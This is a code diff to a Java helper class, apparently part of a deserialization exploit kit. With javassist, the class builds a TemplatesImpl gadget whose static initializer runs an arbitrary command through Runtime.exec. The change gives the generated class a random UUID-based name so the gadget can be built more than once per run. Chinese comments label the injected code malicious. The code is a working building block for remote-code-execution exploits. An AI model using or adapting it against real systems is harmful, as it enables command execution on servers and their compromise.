@@ -7,17 +7,22 @@ import javassist.ClassPool;
 import javassist.CtClass;
 
 import java.lang.reflect.Field;
+import java.util.UUID;
 
 public class TemplateUtils {
     public static TemplatesImpl getTemplate(String common) throws Exception {
+        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
+        UUID uuid = UUID.randomUUID();
+        String replace = uuid.toString().replace("-", "");
+
         ClassPool pool = ClassPool.getDefault();
-        CtClass cc = pool.makeClass("evilclass");
+        CtClass cc = pool.makeClass("a"+replace);
         String cmd = "Runtime.getRuntime().exec(\""+common+"\");";
         //向静态代码块插入恶意代码，插入到构造函数也可以
         cc.makeClassInitializer().insertBefore(cmd);
         //需设置此项才能实现newinstance，具体原因请看defineTransletClasses和getTransletInstance源码
         cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
-        cc.setName("evilClass");
+        cc.setName("A"+replace);
         byte[] evilbytes = cc.toBytecode();
         byte[][] targetByteCodes = new byte[][]{evilbytes};
         TemplatesImpl templates = TemplatesImpl.class.newInstance();
